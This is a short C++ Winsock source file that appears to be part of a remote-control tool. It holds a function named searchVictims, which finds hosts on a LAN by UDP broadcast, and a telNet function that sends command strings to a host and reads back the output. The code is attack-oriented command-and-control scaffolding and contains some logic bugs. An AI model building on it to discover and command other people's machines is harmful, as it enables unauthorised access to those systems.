#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "Network.h"
#include "Utils.h"

#include <winsock2.h>
#include <Ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

#include <time.h>


void searchVictims(SOCKET s, uint32_t* address)
{
	uint32_t victimsAddr;
	sockaddr_in addrinfo{};
	sockaddr_in victiminfo{};

	std::string message, response;
	int error;
	char* buf = new char[65536];
	int infoSize;

	/*these params are the params of the victims*/
	addrinfo.sin_addr.s_addr = inet_addr("10.0.0.8");//broadcastIP();
	addrinfo.sin_port = htons(667);
	addrinfo.sin_family = AF_INET;


	/*fixed messages for my "protocol"*/
	message = "What is your IP?";
	response = "My IP";

	int i = 0;
	for (i; address[i] != NULL; i++)
		continue;

	infoSize = sizeof addrinfo;

	time_t lapTime = time(NULL);
	if(error = sendto(s, message.c_str(), message.size(), 0, (sockaddr*)&addrinfo, sizeof addrinfo) <= 0)
		std::cout << WSAGetLastError();
	for (i; time(NULL) - lapTime < 3; i++) //listening for 3 seconds
	{
		do
		{
			ZeroMemory(buf, 65536);
			if (!recvfrom(s, buf, 65536, 0, (sockaddr*)&addrinfo, &infoSize))
				break;
		} while (std::string(buf)._Equal(response)); //watiting to recv "My IP"
		address[i] = addrinfo.sin_addr.s_addr;
	}
}

std::string telNet(SOCKET sock, std::string& command)
{
	int n;
	char temp[4096] = { 0 };
	send(sock, command.c_str(), command.size(), 0);

	std::string output = "";
	do
	{
		n = recv(sock, temp, sizeof temp, 0);
		if (n == 0)
			return "";
		output += std::string(temp);
		memset(temp, 0, sizeof temp);
	} while (n >= 4096);
	return output;
}